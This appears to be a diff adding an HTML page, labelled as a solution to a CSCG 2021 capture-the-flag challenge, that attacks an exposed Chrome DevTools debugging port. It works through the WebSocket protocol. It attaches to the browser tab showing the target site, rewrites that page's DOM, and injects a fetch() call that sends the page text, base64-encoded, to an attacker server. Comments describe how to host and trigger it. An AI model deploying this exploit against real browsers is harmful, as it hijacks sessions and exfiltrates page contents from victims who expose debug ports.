@@ -1,0 +1,165 @@
+<!doctype HTML>
+<html>
+  <head>
+  <meta charset="utf-8" />
+  <title>WebSocket Test</title>
+  </head>
+  <body>
+    <!-- CSCG 2021 screenshotter solution -->
+    <script language="javascript" type="text/javascript">
+      // get browser Ws URL from /json/version:
+      // http://cscg.de:test@172.18.0.2:9222/json/version
+      var args = window.location.search.substr(1).split(",");
+      var IP = args[0]
+      var wsID = args[1]
+      var wsUri = "ws://" + IP + ":9222/devtools/browser/" + wsID;
+      var output;
+
+      var attackSrv = "http://" + args[2]
+      // server example: python3 -m http.server <port>
+      // Submit http://cscg.de:test@<attackSrv>/wshax3.html to run
+      // spam it or send roughly before flagger takes screenshot
+
+      function sleep(ms) {
+          return new Promise(resolve => setTimeout(resolve, ms));
+      }
+
+      function init()
+      {
+          output = document.getElementById("output");
+          testWebSocket(wsUri);
+      }
+
+      function testWebSocket(wsUri)
+      {
+          websocket = new WebSocket(wsUri);
+          websocket.onopen = function(evt) { onOpen(evt) };
+          websocket.onclose = function(evt) { onClose(evt) };
+          websocket.onmessage = function(evt) { onMessage(evt) };
+          websocket.onerror = function(evt) { onError(evt) };
+
+          document.getElementById('wsUri').value = wsUri
+      }
+
+      function onOpen(evt)
+      {
+          writeToScreen("CONNECTED");
+          // listen for new targets
+          doSend('{"id":1,"method":"Target.setDiscoverTargets","params":{"discover":true}}')
+      }
+
+      function onClose(evt)
+      {
+          writeToScreen("DISCONNECTED: " + evt.code);
+          writeToScreen(evt.reason);
+      }
+
+      function onMessage(evt)
+      {
+          writeToScreen('RESPONSE: ' + evt.data, 'blue');
+          //websocket.close();
+          let data = JSON.parse(evt.data)
+          if (data.method == "Target.targetInfoChanged") {
+              checkTarget(data)
+          }
+          else if (data.method == "Target.attachedToTarget") {
+              targetAttached(data)
+          }
+      }
+
+      function onError(evt)
+      {
+          writeToScreen('ERROR: ' + evt.data, 'red');
+      }
+
+      function checkTarget(data) {
+          if (data.params.targetInfo.url == "https://www.cscg.de/") {
+              if (!data.params.targetInfo.attached) {
+                  writeToScreen('TARGET CLOSED', 'green')
+                  return
+              }
+
+              let targetId = data.params.targetInfo.targetId
+              writeToScreen('FOUND TARGET ' + targetId, 'green')
+
+              let attachMsg = {
+                  "id": 2,
+                  "method": "Target.attachToTarget",
+                  "params": {
+                      "targetId": targetId
+                  }
+              }
+              doSend(JSON.stringify(attachMsg))
+          }
+      }
+
+      async function targetAttached(data) {
+          // wait for page to load
+          await sleep(2000)
+
+          let sessionId = data.params.sessionId
+
+          // make sure node exists
+          let getDoc = {
+              "id": 1336,
+              "method": "DOM.getDocument",
+              "params": {}
+          }
+          sendMsgToTarget(sessionId, getDoc)
+
+          // update title
+          let subMsg = {
+              "id":1337,
+              "method":"DOM.setOuterHTML",
+              "params":{
+                  "nodeId":1,
+                  "outerHTML":"<html><head><title>a onload=fetch('"+attackSrv+"/?'+btoa(document.body.innerText),{mode:'no-cors'})</title></head><body>haxed</body></html>"
+              }
+          }
+          sendMsgToTarget(sessionId, subMsg)
+      }
+
+      function sendMsgToTarget(sessionId, subMsg) {
+          let msg = {
+              "id": 3,
+              "method": "Target.sendMessageToTarget",
+              "params": {
+                  "sessionId": sessionId,
+                  "message": JSON.stringify(subMsg)
+              }
+          }
+
+          doSend(JSON.stringify(msg))
+      }
+
+      function doSend(message)
+      {
+          writeToScreen("SENT: " + message);
+          websocket.send(message);
+      }
+
+      function writeToScreen(message, color='black')
+      {
+          var pre = document.createElement("p");
+          pre.style.wordWrap = "break-word";
+          pre.style.color = color;
+          pre.innerText = message;
+          output.appendChild(pre);
+      }
+
+      window.addEventListener("load", init, false);
+    </script>
+
+  <h2>WebSocket Test</h2>
+  <form>
+    <input type="text" id="wsUri" value="ws://demos.kaazing.com/echo" size="70">
+    <input type="button" id="connectButton" value="Connect" onClick="testWebSocket(getElementById('wsUri').value)">
+    <input type="button" id="disconnectButton" value="Disconnect" onClick="websocket.close()">
+    <br>
+
+    <textarea id="sendtext">hello world</textarea>
+    <input type="button" id="sendbutton" value="Send" onClick="doSend(getElementById('sendtext').value)">
+  </form>
+  <div id="output"></div>
+</body>
+</html>
